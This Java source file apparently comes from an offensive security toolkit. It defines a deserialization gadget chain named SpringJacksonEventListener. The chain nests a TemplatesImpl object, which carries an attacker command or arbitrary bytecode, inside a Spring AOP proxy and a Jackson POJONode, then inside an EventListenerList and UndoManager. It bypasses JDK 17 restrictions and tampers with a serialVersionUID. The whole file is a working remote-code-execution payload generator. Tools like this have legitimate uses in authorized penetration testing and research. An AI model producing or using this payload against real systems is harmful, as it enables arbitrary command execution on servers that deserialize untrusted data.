package com.xyuxu.javasec.core.payload.gadgets;

import com.xyuxu.javasec.core.generator.TemplatesBytecodeGenerator;
import com.xyuxu.javasec.utils.Reflections;
import com.xyuxu.javasec.utils.Serializer;

import javax.swing.event.EventListenerList;
import javax.swing.undo.UndoManager;
import java.util.Vector;

public class SpringJacksonEventListener implements ObjectPayload,BytecodePayload {

    @Override
    public Object getObject(String command) throws Exception {

        Class<?> chainFactory = Class.forName("org.springframework.aop.framework.DefaultAdvisorChainFactory");
        Serializer.hackSerialVersionUID(chainFactory, 6115154060221772279L);

        Object templates = TemplatesBytecodeGenerator.createTemplatesImplBypassJDK17(command);
        Object proxy = SpringJacksonComponent.createSpringAopProxy(templates);
        Object pojoNode = SpringJacksonComponent.createJacksonPOJONode(proxy);
        EventListenerList list = new EventListenerList();
        UndoManager undoManager = new UndoManager();
        Vector vector = (Vector) Reflections.getFieldValue(undoManager, "edits");
        vector.add(pojoNode);
        Reflections.setFieldValue(list, "listenerList", new Object[]{InternalError.class, undoManager});
        return list;

    }

    @Override
    public Object getObjectWithBytecode(byte[] bytecode) throws Exception {
        Class<?> chainFactory = Class.forName("org.springframework.aop.framework.DefaultAdvisorChainFactory");
        Serializer.hackSerialVersionUID(chainFactory, 6115154060221772279L);
        Object templates = TemplatesBytecodeGenerator.createTemplatesImplWithBytecodeBypassJDK17(bytecode);
        Object proxy = SpringJacksonComponent.createSpringAopProxy(templates);
        Object pojoNode = SpringJacksonComponent.createJacksonPOJONode(proxy);

        EventListenerList list = new EventListenerList();
        UndoManager undoManager = new UndoManager();
        Vector vector = (Vector) Reflections.getFieldValue(undoManager, "edits");
        vector.add(pojoNode);

        Reflections.setFieldValue(list, "listenerList", new Object[]{InternalError.class, undoManager});
        return list;
    }
}